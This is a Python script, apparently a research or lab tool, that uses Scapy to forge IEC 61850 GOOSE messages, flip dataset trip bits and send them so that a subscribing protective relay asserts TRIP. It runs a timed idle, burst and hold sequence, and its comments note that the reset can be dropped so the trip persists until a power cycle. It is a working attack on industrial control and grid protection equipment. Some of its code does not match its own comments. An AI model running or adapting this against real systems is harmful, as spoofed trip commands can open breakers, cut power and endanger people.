#!/usr/bin/env python3
"""
goose_trip.py

Fork of goose_honk.py
Designed to take goose_honk.py sending logic and apply trip logic specficially
targeting GOOSE-oriented trip logic. Must be configured depending on production-level
set up. Recommended to take data from packet capture and configure based upon its data.

Created By Ashton Ruesch

Example Usage
================
# One-shot idle -> trip -> hold -> reset sequence (tagged VLAN 1):
sudo python3 goose_trip.py -i eth0 -t

# Same sequence on an access port (untagged):
sudo python3 goose_trip.py -i eth0 -u -t

# Custom timings (3s idle, 2s burst, 10s hold):
sudo python3 goose_trip.py -i eth0 -t --idle 3 --burst 2 --hold 10

# Stream 10 fps tagged trip frames (continuous, no sequence):
sudo python3 goose_trip.py -i eth0 -r 10 -t

Arguments:
================
-i, --iface    : Network interface to send on (required)
-u, --untagged : Send untagged EtherType (0x88B8) instead of 802.1Q
-r, --rate     : Frames per second (0 = single-shot)
-t, --trip     : Force the first four dataset boolean bits to TRUE
"""

import argparse
import struct
import time
from scapy.all import Ether, Dot1Q, Raw, sendp

# --------------------- ASCII ART ---------------------
GOOSE_ART = r"""
                                                                                 
                                  @@@@@@@@@                                          
                                @*         @@                                        
                               @      @@    @-                                       
       Honking                 @@@@@  @@@    @:                   -@@@=              
     With Intent               .  :#@         %               @@+ . =**@             
                              @=#@= =@      : @           @@  +*@@@@#  #@            
                            @ *#%+=*@@@   :=* @       @@  %@@@ %#: :@%-@@            
                           @+@@@@@@@@  @@@:.  @  :@@  +#@%#- :* =@@@@@.@=            
                            @@+      @@*      @:  =#@@@@*  *%*@@@@@@@.               
                                     @        @@%@:.   #@@@@@@@@                     
                                    @@       @@ .=+@@@@:@@@                          
                                    @        @@@@@@@@@=           @@                 
                       .         @ @        :@@.@             @ @=  @                
                    @@.   @  @@ @ @@        @              @.@  @   %                
                  @     @  @@:@-@@@  .   .  @ *@@@@@@@@%. @    ..   @@@=             
                @    @   @  *@@-@@          @              +@%  @   @  @             
           @@  @@*@   @. @@-  @                         *@    @@ @     @             
          %@# =@ +@@@@@@.   @#  @                          @@   @     @              
           @@@%@@@@.      @.  *@   .                    -@    @@@    @               
           %@@@@  @   .::   :. @             @            @@=  @    @@               
                   @@  ..::::: @              @              @@     @                
                     @         @@              @@:++==-=.@@@     : @*                
                       @@@@@+   @                .+%@@%#-      -: +@                 
                          @@@@@@@@@  :                     @:=:  @@                  
                                   @@  .-=-=:= @           @   %@                    
                                     @@@        @@       @@  @@                      
                                        @@@@-#=   #@@@@@@%@@                         
                                        @ +@@@@     @ :@-                            
                                       @@@@         @ =@                             
                                @@@@@@@@*+%          %@@                             
                               @@@@@%@@@@@@@@ @@@-@% *+=@@@                          
                                  @@@@      @@@  @%#+@@ +=                           
                                             @@@@@@@@                                
                                                                                                                                                                                       
"""

# ------------------- Configuration -------------------
DST_MAC = "01:0C:CD:01:00:01"       # Destination multicast MAC for AppID 0x004 (GOOSE)
SRC_MAC = "00:e0:4c:94:2b:b3"       # Source MAC
APPID   = 0x03e8                   # IEC 61850 GOOSE Application ID
TTL_MS  = 2000                      # timeAllowedToLive in ms
CONF_REV = 1                        # Configuration Revision (must match SCL/CID file)
VLAN_ID  = 1                        # VLAN ID
VLAN_PCP = 4                        # VLAN Priority


# --------- Payload Data Settings (versatile) ---------
"""
Data is the raw bytes taken from a fabricated publication.

- Data must be different depending on the publication/subscription.
- In an attack scenario, you'd likely want to capture the fake publication data first.
- Then use that data to fabricate a fake publication where you can take the bytes and flip
- booleans etc. to be able to send a properly-formatted packet.
- Note that some implementations of GOOSE require NIC level source MAC matching.
"""

# Set this hex string to your dataset payload (no spaces)
DATA_HEX = (
    "8301018501198910fc30645075dc8d02ed780e4caca42e07"
)

# Build ALL_DATA from raw Hex
ALL_DATA = bytes.fromhex(DATA_HEX)

# Byte Offsets for trip bits, etc. (tweak to match your dataset structure)
OFFSETS = (2,)

# ------------------- Helper Functions ------------------

def tlv(tag, val):
    """
    Build a BER TLV block: [Tag][Length][Value].
    """
    ln = len(val)
    if ln < 0x80:
        return bytes([tag, ln]) + val
    if ln < 0x100:
        return bytes([tag, 0x81, ln]) + val
    return bytes([tag, 0x82]) + struct.pack("!H", ln) + val

def tod():
    """
    Returns the current Time of Day.
    """
    now = time.time()
    secs = int(now)
    frac = int((now - secs) * (1 << 24))
    return struct.pack("!L", secs) + frac.to_bytes(3, "big") + b"\x00"

def patch_trip(trip):
    """
    Return ALL_DATA with boolean fields set to 1 at specified offsets if trip=True.
    """
    if not trip:
        return ALL_DATA
    b = bytearray(ALL_DATA)
    for i in OFFSETS:
        b[i] = 0x00
    return bytes(b)

def build_frame(st, sq, untagged, trip):
    """
    Construct an Ethernet frame carrying a GOOSE PDU.

    st_num      : GOOSE state number (0-255)
    sq_num      : Sequence number (0-65535)
    untagged    : Skip VLAN tagging
    trip        : True to set trip bits in payload (Or other bytes)
    """
    body = b"".join([
        tlv(0x80, b"IEDA/LLN0$GO$healthA"),              # gocbRef
        tlv(0x81, struct.pack("!H", TTL_MS)),           # timeAllowedToLive
        tlv(0x82, b"IEDA/LLN0$AnalogValues"),                # datSet
        tlv(0x83, b"IEDA/LLN0$GO$healthA"),                       # goID
        tlv(0x84, tod()),                               # Timestamp
        tlv(0x85, struct.pack("!B", st & 0xFF)),        # stNum
        tlv(0x86, struct.pack("!H", sq & 0xFFFF)),      # sqNum
        tlv(0x87, b"\x00"),                             # simulation (testing/cannot trip) = FALSE
        tlv(0x88, struct.pack("!B", CONF_REV)),         # confRev
        tlv(0x89, b"\x00"),                             # ndsCom = FALSE
        tlv(0x8A, b"\x02"),                             # numDatSetEntries
        tlv(0xAB, patch_trip(trip)),                    # allData
    ])
    # Wrap in sequence
    pdu = tlv(0x61, body)

    # Prepend header: [AppID][Length][0][0]
    goose_hdr = struct.pack("!HHHH", APPID, len(pdu) + 8, 0, 0)
    payload = goose_hdr + pdu

    # Ethernet + optional VLAN
    if untagged:
        eth = Ether(dst=DST_MAC, src=SRC_MAC, type=0x88B8)
    else:
        eth = Ether(dst=DST_MAC, src=SRC_MAC, type=0x8100) / Dot1Q(prio=VLAN_PCP, vlan=VLAN_ID, type=0x88B8)
    return eth / Raw(load=payload)

# ------------------- Sequence Sender -------------------
def run_sequence(iface, untagged, idle_s, burst_s, hold_s):
    """
    Idle -> Trip -> Hold -> Reset timeline.

    Phase details:
    1. Idle  - stNum 1, trip bits 0, 10 fps. Keeps subscriber Good.
    2. Burst - stNum 2, trip bits 1, 10 fps. Flips RB1 so TRIP asserts.
    3. Hold  - stNum 2, 1 fps. Lets LEDs/contacts be observed.
    4. Reset - stNum 3, trip bits 0, single frame. Clears TRIP.
        * Can theoretically be removed to continue spamming TRIP.
    """
    print(GOOSE_ART)
    tag = untagged

    # ----- IDLE ----------------------------------------
    st = 1
    sq = 0
    frame = build_frame(st, sq, tag, trip=False)
    end = time.time() + idle_s
    while time.time() < end:
        sendp(frame, iface=iface, verbose=False, inter=0)
        sq = (sq + 1) & 0xFFFF
        frame = build_frame(st, sq, tag, trip=False)
        time.sleep(0.1)

    # ----- BURST (trip assert) -------------------------
    st = 2
    sq = 0
    frames = []
    for _ in range(8):                              # >=3 frames within window; 8 gives margin
        frames.append(build_frame(st, sq, tag, trip=True))
        sq = (sq + 1) & 0xFFFF
    
    sendp(frames, iface=iface, verbose=False, inter=0)  # <-- SEND THEM back-to-back



    # ----- HOLD ----------------------------------------
    end = time.time() + hold_s
    while time.time() < end:
        sendp(frame, iface=iface, verbose=False, inter=0)
        sq = (sq + 1) & 0xFFFF
        frame = build_frame(st, sq, tag, trip=True)
        time.sleep(1.0)

    # ----- RESET ---------------------------------------
    # Comment Next 2 Lines to Make Reset Require Power Cycle
    print("Trip Sequence Complete.")

# ------------------------ Main -------------------------
def main():
    p = argparse.ArgumentParser(description="Send spoofed GOOSE frames")
    p.add_argument("-i", "--iface", required=True, help="Interface to send on")
    p.add_argument("-u", "--untagged", action="store_true", help="Send untagged (no VLAN)")
    p.add_argument("-r", "--rate", type=float, default=0, help="Stream fps (0 = single)")
    p.add_argument("-t", "--trip", action="store_true", help="Run tripping sequence unless rate set")
    p.add_argument("--idle", type=float, default=5, help="Idle seconds before trip")
    p.add_argument("--burst", type=float, default=4, help="Trip burst seconds (10 fps)")
    p.add_argument("--hold", type=float, default=10, help="Hold seconds at 1 fps")
    args = p.parse_args()

    # Default behavior: if -t is present and no streaming rate is specified, run full idle->trip->hold->reset sequence.
    if args.trip and args.rate == 0:
        run_sequence(args.iface, args.untagged, args.idle, args.burst, args.hold)
        return

    st = 1
    sq = 1
    frame = build_frame(st, sq, args.untagged, args.trip)

    print(GOOSE_ART)
    if args.rate <= 0:
        print("Sending single GOOSE frame...")
        sendp(frame, iface=args.iface, verbose=True, inter=0)
    else:
        interval = 1.0 / args.rate
        print(f"Streaming {args.rate:.1f} fps on {args.iface}")
        try:
            while True:
                sendp(frame, iface=args.iface, verbose=False, inter=0)
                sq = (sq + 1) & 0xFFFF
                frame = build_frame(st, sq, args.untagged, args.trip)
                time.sleep(interval)
        except KeyboardInterrupt:
            print("Stopped.")

if __name__ == "__main__":
    main()
